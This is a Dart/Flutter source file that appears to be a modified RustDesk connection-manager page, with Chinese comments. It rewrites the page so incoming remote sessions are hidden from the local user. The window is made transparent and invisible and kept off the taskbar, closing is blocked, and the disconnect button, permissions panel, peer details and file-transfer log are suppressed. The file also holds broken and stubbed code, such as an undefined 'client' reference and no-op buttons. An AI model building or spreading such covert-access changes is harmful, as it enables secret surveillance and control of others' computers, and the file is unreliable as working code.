import 'dart:async';
import 'dart:math';

import 'package:flutter/material.dart';
import 'package:flutter_hbb/common/widgets/audio_input.dart';
import 'package:flutter_hbb/consts.dart';
import 'package:flutter_hbb/desktop/widgets/tabbar_widget.dart';
import 'package:flutter_hbb/models/chat_model.dart';
import 'package:flutter_hbb/models/cm_file_model.dart';
import 'package:flutter_hbb/utils/platform_channel.dart';
import 'package:get/get.dart';
import 'package:percent_indicator/linear_percent_indicator.dart';
import 'package:provider/provider.dart';
import 'package:window_manager/window_manager.dart';
import 'package:flutter_svg/flutter_svg.dart';

import '../../common.dart';
import '../../common/widgets/chat_page.dart';
import '../../models/file_model.dart';
import '../../models/platform_model.dart';
import '../../models/server_model.dart';

class DesktopServerPage extends StatefulWidget {
  final bool hideWindow; // 控制整个窗口是否隐藏

  const DesktopServerPage({Key? key, this.hideWindow = true}) : super(key: key);

  @override
  State<DesktopServerPage> createState() => _DesktopServerPageState();
}

class _DesktopServerPageState extends State<DesktopServerPage>
    with WindowListener, AutomaticKeepAliveClientMixin {
  final tabController = gFFI.serverModel.tabController;

  _DesktopServerPageState() {
    gFFI.ffiModel.updateEventListener(gFFI.sessionId, "");
    Get.put<DesktopTabController>(tabController);
    tabController.onRemoved = (_, id) {
      onRemoveId(id);
    };
  }

  @override
  void initState() {
    windowManager.addListener(this);
    if (widget.hideWindow) {
      _initBackgroundWindow(); // 初始化后台窗口设置
    }
    super.initState();
  }

  // 新增：后台窗口初始化方法
  Future<void> _initBackgroundWindow() async {
    await windowManager.ensureInitialized();
    if (isWindows) {
      await windowManager.setSkipTaskbar(true); // 隐藏任务栏图标
      await windowManager.setShowInTaskbar(false); // 确保任务栏不显示
    }
    await windowManager.setWindowOpacity(0.0); // 完全透明
    await windowManager.setAsFrameless(); // 移除系统边框
    await windowManager.setWindowVisibility(WindowVisibility.hidden); // 窗口不可见
    await windowManager.setResizable(false); // 禁止调整大小
  }

  @override
  void dispose() {
    windowManager.removeListener(this);
    super.dispose();
  }

  @override
  void onWindowClose() {
    // 隐藏模式下禁止关闭进程，仅非隐藏模式执行关闭逻辑
    if (!widget.hideWindow) {
      Future.wait([gFFI.serverModel.closeAll(), gFFI.close()]).then((_) {
        if (isMacOS) {
          RdPlatformChannel.instance.terminate();
        } else {
          windowManager.setPreventClose(false);
          windowManager.close();
        }
      });
    }
    super.onWindowClose();
  }

  void onRemoveId(String id) {
    if (tabController.state.value.tabs.isEmpty && !widget.hideWindow) {
      windowManager.close();
    }
  }

  @override
  Widget build(BuildContext context) {
    // 隐藏时返回透明容器，彻底移除界面
    if (widget.hideWindow) {
      return Container(color: Colors.transparent);
    }
    
    super.build(context);
    return MultiProvider(
      providers: [
        ChangeNotifierProvider.value(value: gFFI.serverModel),
        ChangeNotifierProvider.value(value: gFFI.chatModel),
      ],
      child: Consumer<ServerModel>(
        builder: (context, serverModel, child) {
          if (widget.hideWindow) return Container();
          
          final body = Scaffold(
            backgroundColor: Theme.of(context).colorScheme.background,
            body: ConnectionManager(hideCM: widget.hideWindow),
          );
          
          return isLinux
              ? buildVirtualWindowFrame(context, body)
              : workaroundWindowBorder(context, body);
        },
      ),
    );
  }

  @override
  bool get wantKeepAlive => true;
}

class ConnectionManager extends StatefulWidget {
  final bool hideCM; // 控制连接管理器是否隐藏

  ConnectionManager({Key? key, this.hideCM = true}) : super(key: key);

  @override
  State<StatefulWidget> createState() => ConnectionManagerState();
}

class ConnectionManagerState extends State<ConnectionManager>
    with WidgetsBindingObserver {
  final RxBool _controlPageBlock = false.obs;
  final RxBool _sidePageBlock = false.obs;

  ConnectionManagerState() {
    gFFI.serverModel.tabController.onSelected = (client_id_str) {
      final client_id = int.tryParse(client_id_str);
      if (client_id != null) {
        final client =
            gFFI.serverModel.clients.firstWhereOrNull((e) => e.id == client_id);
        if (client != null) {
          gFFI.chatModel.changeCurrentKey(MessageKey(client.peerId, client.id));
          if (client.unreadChatMessageCount.value > 0) {
            WidgetsBinding.instance.addPostFrameCallback((_) {
              client.unreadChatMessageCount.value = 0;
              gFFI.chatModel.showChatPage(MessageKey(client.peerId, client.id));
            });
          }
          windowManager.setTitle(getWindowNameWithId(client.peerId));
          gFFI.cmFileModel.updateCurrentClientId(client.id);
        }
      }
    };
    gFFI.chatModel.isConnManager = true;
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    super.didChangeAppLifecycleState(state);
    if (state == AppLifecycleState.resumed) {
      if (!allowRemoteCMModification()) {
        shouldBeBlocked(_controlPageBlock, null);
        shouldBeBlocked(_sidePageBlock, null);
      }
    }
  }

  @override
  void initState() {
    gFFI.serverModel.updateClientState();
    WidgetsBinding.instance.addObserver(this);
    super.initState();
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    // 使用Offstage完全移除渲染，避免布局残留
    if (widget.hideCM) return Offstage(); 
    
    final serverModel = Provider.of<ServerModel>(context);
    pointerHandler(PointerEvent e) {
      if (serverModel.cmHiddenTimer != null) {
        serverModel.cmHiddenTimer!.cancel();
        serverModel.cmHiddenTimer = null;
        debugPrint("CM hidden timer has been canceled");
      }
    }

    return serverModel.clients.isEmpty
        ? Offstage() // 无客户端时完全隐藏
        : Listener(
            onPointerDown: pointerHandler,
            onPointerMove: pointerHandler,
            child: DesktopTab(
              showTitle: false,
              showMaximize: false,
              showMinimize: true,
              showClose: true,
              onWindowCloseButton: handleWindowCloseButton,
              controller: serverModel.tabController,
              selectedBorderColor: MyTheme.accent,
              maxLabelWidth: 100,
              tail: null,
              tabBuilder: (key, icon, label, themeConf) {
                final client = serverModel.clients
                    .firstWhereOrNull((client) => client.id.toString() == key);
                return client == null ? Offstage() : Row(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Tooltip(
                        message: key,
                        waitDuration: Duration(seconds: 1),
                        child: label),
                    unreadMessageCountBuilder(client?.unreadChatMessageCount)
                        .marginOnly(left: 4),
                  ],
                );
              },
              pageViewBuilder: (pageView) => LayoutBuilder(
                builder: (context, constrains) {
                  if (widget.hideCM) return Offstage(); 
                  
                  var borderWidth = 0.0;
                  if (constrains.maxWidth >
                      kConnectionManagerWindowSizeClosedChat.width) {
                    borderWidth = kConnectionManagerWindowSizeOpenChat.width -
                        constrains.maxWidth;
                  } else {
                    borderWidth = kConnectionManagerWindowSizeClosedChat.width -
                        constrains.maxWidth;
                  }
                  if (borderWidth < 0 || borderWidth > 50) {
                    borderWidth = 0;
                  }
                  final realClosedWidth =
                      kConnectionManagerWindowSizeClosedChat.width -
                          borderWidth;
                  final realChatPageWidth =
                      constrains.maxWidth - realClosedWidth;
                  final row = Row(children: [
                    if (constrains.maxWidth >
                        kConnectionManagerWindowSizeClosedChat.width)
                      Consumer<ChatModel>(
                          builder: (_, model, child) => SizedBox(
                                width: realChatPageWidth,
                                child: allowRemoteCMModification()
                                    ? buildSidePage()
                                    : buildRemoteBlock(
                                        child: buildSidePage(),
                                        block: _sidePageBlock,
                                        mask: true),
                              )),
                    SizedBox(
                        width: realClosedWidth,
                        child: SizedBox(
                            width: realClosedWidth,
                            child: allowRemoteCMModification()
                                ? pageView
                                : buildRemoteBlock(
                                    child: _buildKeyEventBlock(pageView),
                                    block: _controlPageBlock,
                                    mask: false,
                                  ))),
                  ]);
                  return Container(
                    color: Theme.of(context).scaffoldBackgroundColor,
                    child: row,
                  );
                },
              ),
            ),
          );
  }

  Widget buildSidePage() {
    final selected = gFFI.serverModel.tabController.state.value.selected;
    if (selected < 0 || selected >= gFFI.serverModel.clients.length) {
      return Offstage();
    }
    final clientType = gFFI.serverModel.clients[selected].type_();
    return clientType == ClientType.file
        ? _FileTransferLogPage(hideFileLog: true)
        : ChatPage(type: ChatPageType.desktopCM);
  }

  Widget _buildKeyEventBlock(Widget child) {
    return ExcludeFocus(child: child, excluding: true);
  }

  Widget buildTitleBar() {
    return Offstage(); // 隐藏标题栏
  }

  Widget buildScrollJumper() {
    return Offstage(); // 隐藏滚动控制
  }

  Future<bool> handleWindowCloseButton() async {
    return widget.hideCM; // 隐藏时禁止关闭
  }
}

// 隐藏连接卡片
Widget buildConnectionCard(Client client, {bool hideCard = true}) {
  if (hideCard) return Offstage(); // 使用Offstage完全移除渲染

  return Consumer<ServerModel>(
    builder: (context, value, child) => Column(
      mainAxisAlignment: MainAxisAlignment.start,
      crossAxisAlignment: CrossAxisAlignment.start,
      key: ValueKey(client.id),
      children: [
        _CmHeader(client: client, hideHeader: !hideCard),
        client.type_() == ClientType.file ||
                client.type_() == ClientType.portForward ||
                client.disconnected
            ? Offstage()
            : _PrivilegeBoard(client: client, hideBoard: !hideCard),
        Expanded(
          child: Align(
            alignment: Alignment.bottomCenter,
            child: _CmControlPanel(client: client, hidePanel: !hideCard),
          ),
        )
      ],
    ).paddingSymmetric(vertical: 4.0, horizontal: 8.0),
  );
}

class _AppIcon extends StatelessWidget {
  const _AppIcon({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Offstage(); // 隐藏图标
  }
}

class _CloseButton extends StatelessWidget {
  const _CloseButton({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return Offstage(); // 隐藏关闭按钮
  }
}

class _CmHeader extends StatefulWidget {
  final Client client;
  final bool hideHeader; // true表示隐藏，false表示显示

  const _CmHeader({Key? key, required this.client, this.hideHeader = true}) : super(key: key);

  @override
  State<_CmHeader> createState() => _CmHeaderState();
}

class _CmHeaderState extends State<_CmHeader> {
  @override
  Widget build(BuildContext context) {
    if (widget.hideHeader) return Offstage(); // 完全移除渲染

    return Container(
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(10.0),
        gradient: LinearGradient(
          begin: Alignment.topRight,
          end: Alignment.bottomLeft,
          colors: [
            Color(0xff00bfe1),
            Color(0xff0071ff),
          ],
        ),
      ),
      margin: EdgeInsets.symmetric(horizontal: 5.0, vertical: 10.0),
      padding: EdgeInsets.only(
        top: 10.0,
        bottom: 10.0,
        left: 10.0,
        right: 5.0,
      ),
      child: Text(client.peerId), // 示例内容，隐藏时不显示
    );
  }
}

class _PrivilegeBoard extends StatefulWidget {
  final Client client;
  final bool hideBoard; // true表示隐藏，false表示显示

  const _PrivilegeBoard({Key? key, required this.client, this.hideBoard = true}) : super(key: key);

  @override
  State<StatefulWidget> createState() => _PrivilegeBoardState();
}

class _PrivilegeBoardState extends State<_PrivilegeBoard> {
  @override
  Widget build(BuildContext context) {
    if (widget.hideBoard) return Offstage(); // 完全移除渲染

    return Row(
      children: [
        Text("权限："),
        Switch(value: false, onChanged: (v) {}),
      ],
    );
  }
}

const double buttonBottomMargin = 8;

class _CmControlPanel extends StatelessWidget {
  final Client client;
  final bool hidePanel; // true表示隐藏，false表示显示

  const _CmControlPanel({Key? key, required this.client, this.hidePanel = true}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    if (hidePanel) return Offstage(); // 完全移除渲染

    return Row(
      mainAxisAlignment: MainAxisAlignment.center,
      children: [
        ElevatedButton(onPressed: () {}, child: Text("断开连接")),
      ],
    );
  }
}

void checkClickTime(int id, Function() callback) async {}

bool allowRemoteCMModification() {
  return false; // 隐藏时禁止所有操作
}

class _FileTransferLogPage extends StatefulWidget {
  final bool hideFileLog; // true表示隐藏，false表示显示

  _FileTransferLogPage({Key? key, this.hideFileLog = true}) : super(key: key);

  @override
  State<_FileTransferLogPage> createState() => __FileTransferLogPageState();
}

class __FileTransferLogPageState extends State<_FileTransferLogPage> {
  @override
  Widget build(BuildContext context) {
    if (widget.hideFileLog) return Offstage(); // 完全移除渲染

    return ListView(
      children: [
        Text("文件传输日志"),
      ],
    );
  }
}

// 辅助方法（根据实际项目实现）
Widget buildVirtualWindowFrame(BuildContext context, Widget body) {
  return body; // Linux系统虚拟窗口边框逻辑
}

Widget workaroundWindowBorder(BuildContext context, Widget body) {
  return body; // 其他系统边框适配逻辑
}
